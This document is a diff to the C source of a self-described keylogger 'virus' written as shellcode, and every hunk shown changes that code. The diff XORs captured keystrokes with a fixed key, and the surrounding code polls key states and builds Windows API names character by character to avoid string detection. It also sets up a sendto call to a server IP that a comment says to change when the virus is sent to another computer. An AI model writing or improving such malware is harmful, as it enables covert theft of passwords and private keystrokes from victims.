@@ -12,6 +12,7 @@
 #define MAX_MSG_LENGTH 1024
 #define BUFFER_LENGTH 10
 #define KEY_PRESSED_SINCE_LAST_CALL 0x0001
+#define ENCRYPTION_KEY 0xFA
 
 #define TO_LOWER(c){\
 			if(c >= 'A' && c <= 'Z')\
@@ -118,7 +119,8 @@ __forceinline void stuck_thread()
 
 __forceinline void keylogger()
 {
-	// this lines is to fix push 'arguments to function hurt local variables bug'.
+	// this lines is to fix 'push arguments to function hurt local variables bug'.
+	// This bug is because that the function is inline and also got local variables.
 	_asm
 	{
 		push ebp
@@ -141,6 +143,7 @@ __forceinline void keylogger()
 	char htons_name[] = { 'h', 't', 'o', 'n', 's', 0 };
 	char inet_addr_name[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0 };
 	char sendto_name[] = { 's', 'e', 'n', 'd', 't', 'o', 0 };
+	// This function should be change if virus sent to different computer.
 	char server_ip[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 };
 	char create_thread_name[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
 
@@ -236,10 +239,10 @@ __forceinline void keylogger()
 	//start communication
 	while (1)
 	{
-		for (int i = 8; i <= 190; i++) {
+		for (unsigned char i = 8; i <= 190; i++) {
 			if (M_GetAsyncKeyState(i) & KEY_PRESSED_SINCE_LAST_CALL)
 			{
-				msg_buf[key_counter] = i;
+				msg_buf[key_counter] = i ^ ENCRYPTION_KEY;
 				key_counter++;
 			}
 		}
@@ -332,12 +335,6 @@ int shellcode(VOID)
 	// Could be accessed only by jump or goto.
 	if (0)
 	{
-		//_asm
-		//{
-		//	// Get call to keylogger address. 
-		//	pop eax
-		//	mov [thread_start_address], eax
-		//}
 	create_thread:
 		// Get CreateThread function.
 		M_CreateThread =
